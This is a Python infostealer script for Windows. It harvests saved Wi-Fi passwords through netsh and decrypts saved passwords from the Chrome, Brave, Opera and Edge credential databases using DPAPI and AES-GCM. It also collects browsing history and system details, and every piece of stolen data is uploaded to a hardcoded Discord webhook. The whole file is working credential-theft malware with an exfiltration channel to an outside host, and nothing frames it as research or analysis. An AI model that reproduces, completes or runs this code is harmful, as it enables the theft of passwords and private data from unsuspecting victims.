from typing import List, Dict
#!/usr/bin/python
import os
import re
import sqlite3
import platform
import uuid
import requests
import json
import win32crypt
from base64 import b64decode
from Crypto.Cipher import AES
import socket  # Missing import
import sys     # Missing import
from collections import OrderedDict

WEBHOOK_URL = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"

def send_to_discord(filename, content):
    if not content or not str(content).strip():
        print(f"No content to send for {filename}.")
        return
    try:
        print(f"Sending {filename} to Discord...")
        files = {'file': (filename, content)}
        response = requests.post(WEBHOOK_URL, files=files)
        print(f"Discord response: {response.status_code} {response.text}")
        if response.status_code != 200:
            print(f"Failed to send {filename} to Discord.")
    except Exception as e:
        print(f"Error sending {filename} to Discord: {e}")

def get_system_info():
    try:
        info = f"""
System Info:
Name: {socket.gethostname()}
FQDN: {socket.getfqdn()}
Platform: {sys.platform}
Machine: {platform.machine()}
Processor: {platform.processor()}
OS: {platform.system()}
Release: {platform.release()}
Version: {platform.version()}
"""
        return info
    except Exception as e:
        print(f"Error getting system info: {e}")
        return ""

def extract_wifi():
    def get_wlans():
        try:
            data = os.popen("netsh wlan show profiles").read()
            return re.findall(r"All User Profile\s*:\s(.*)", data)
        except:
            return []

    def get_pass(network):
        try:
            cmd = f'netsh wlan show profile name="{network}" key=clear'
            wlan = os.popen(cmd).read()
            match = re.search(r"Key Content\s*:\s(.*)", wlan)
            return match.group(1).strip() if match else "N/A"
        except:
            return "N/A"

    wifi_data = []
    wlans = get_wlans()
    if not wlans:
        print("No WiFi networks found.")
        return
    for wlan in wlans:
        password = get_pass(wlan)
        wifi_data.append(f"SSID: {wlan}\nPassword: {password}\n---\n")
    result = "".join(wifi_data)
    if result.strip():
        print("WiFi data found, sending to Discord...")
        send_to_discord("wifi.txt", result)
    else:
        print("No WiFi data found.")



def get_browser_profiles() -> Dict[str, Dict[str, str]]:
    """Return browser names and their profile paths for password/history extraction."""
    localappdata = os.getenv('LOCALAPPDATA')
    browsers = {}
    if localappdata:
        browsers['Chrome'] = {
            'login': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'History'),
        }
        browsers['Brave'] = {
            'login': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
        }
        browsers['Opera'] = {
            'login': os.path.join(localappdata, 'Opera Software', 'Opera Stable', 'Login Data'),
            'history': os.path.join(localappdata, 'Opera Software', 'Opera Stable', 'History'),
        }
        browsers['Edge'] = {
            'login': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
        }
    return browsers

def extract_browser_passwords():
    browsers = get_browser_profiles()
    temp_env = os.getenv('TEMP')
    if not temp_env:
        print("TEMP environment variable not found. Skipping password extraction.")
        return
    for name, paths in browsers.items():
        login_path = paths['login']
        if not os.path.exists(login_path):
            print(f"{name} Login Data not found.")
            continue
        # Get AES key from Local State
        local_state_path = None
        localappdata = os.getenv('LOCALAPPDATA')
        if not localappdata:
            print(f"LOCALAPPDATA not found for {name}. Skipping AES decryption.")
        else:
            if name == 'Chrome':
                local_state_path = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Local State')
            elif name == 'Brave':
                local_state_path = os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')
            elif name == 'Opera':
                local_state_path = os.path.join(localappdata, 'Opera Software', 'Opera Stable', 'Local State')
            elif name == 'Edge':
                local_state_path = os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Local State')
        aes_key = None
        if local_state_path and os.path.exists(local_state_path):
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = b64decode(local_state['os_crypt']['encrypted_key'])
                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                aes_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except Exception as e:
                print(f"Failed to get AES key for {name}: {e}")
        temp_path = os.path.join(temp_env, f'{name.lower()}_temp.db')
        try:
            open(temp_path, 'a').close()
            with open(login_path, 'rb') as f1, open(temp_path, 'wb') as f2:
                f2.write(f1.read())
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            passwords = []
            for site, user, encrypted_pass in cursor.fetchall():
                try:
                    if encrypted_pass[:3] == b'v10' or encrypted_pass[:3] == b'v11':
                        if aes_key:
                            iv = encrypted_pass[3:15]
                            payload = encrypted_pass[15:]
                            cipher = AES.new(aes_key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                            passwords.append(f"URL: {site}\nUser: {user}\nPass: {decrypted_pass}\n---\n")
                        else:
                            passwords.append(f"URL: {site}\nUser: {user}\nPass: [AES key not found]---\n")
                    else:
                        decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1]
                        passwords.append(f"URL: {site}\nUser: {user}\nPass: {decrypted.decode('utf-8')}\n---\n")
                except Exception as e:
                    print(f"Failed to decrypt password for {site} in {name}: {e}")
                    continue
            conn.close()
            if passwords:
                print(f"{name} passwords found, sending to Discord...")
                send_to_discord(f"{name.lower()}_passwords.txt", "".join(passwords))
            else:
                print(f"No {name} passwords found.")
        except Exception as e:
            print(f"Error extracting {name} passwords: {e}")
        finally:
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except Exception as e:
                print(f"Error removing temp file for {name}: {e}")

def extract_browser_history():
    browsers = get_browser_profiles()
    for name, paths in browsers.items():
        history_path = paths['history']
        if not os.path.exists(history_path):
            print(f"{name} History DB not found.")
            continue
        try:
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100")
            history = OrderedDict()
            def parse(url):
                try:
                    return url.split('//')[1].split('/')[0].replace("www.", "")
                except Exception as e:
                    print(f"Failed to parse url {url}: {e}")
                    return url[:50]
            for url, count in cursor.fetchall():
                domain = parse(url)
                history[domain] = history.get(domain, 0) + count
            conn.close()
            if history:
                sorted_history = "\n".join(f"{site}: {visits}" for site, visits in history.items())
                print(f"{name} history found, sending to Discord...")
                send_to_discord(f"{name.lower()}_history.txt", sorted_history)
            else:
                print(f"No {name} history found.")
        except Exception as e:
            print(f"Error extracting {name} history: {e}")

def extract_chrome_history():
    try:
        localappdata = os.getenv('LOCALAPPDATA')
        if not localappdata:
            print("LOCALAPPDATA not found.")
            return
        history_db = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'history')
        if not os.path.exists(history_db):
            print("Chrome history DB not found.")
            return

        def parse(url):
            try:
                return url.split('//')[1].split('/')[0].replace("www.", "")
            except Exception as e:
                print(f"Failed to parse url {url}: {e}")
                return url[:50]  # Return first 50 chars if parsing fails

        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100")

        history = OrderedDict()
        for url, count in cursor.fetchall():
            domain = parse(url)
            history[domain] = history.get(domain, 0) + count

        if history:
            sorted_history = "\n".join(f"{site}: {visits}" for site, visits in history.items())
            print("Chrome history found, sending to Discord...")
            send_to_discord("chrome_history.txt", sorted_history)
        else:
            print("No Chrome history found.")
    except Exception as e:
        print(f"Error extracting Chrome history: {e}")

if __name__ == "__main__":
    print("Extracting WiFi...")
    extract_wifi()
    print("Extracting browser passwords...")
    extract_browser_passwords()
    print("Extracting browser history...")
    extract_browser_history()
    print("Sending system info to Discord...")
    sysinfo = get_system_info()
    send_to_discord("system_info.txt", sysinfo)
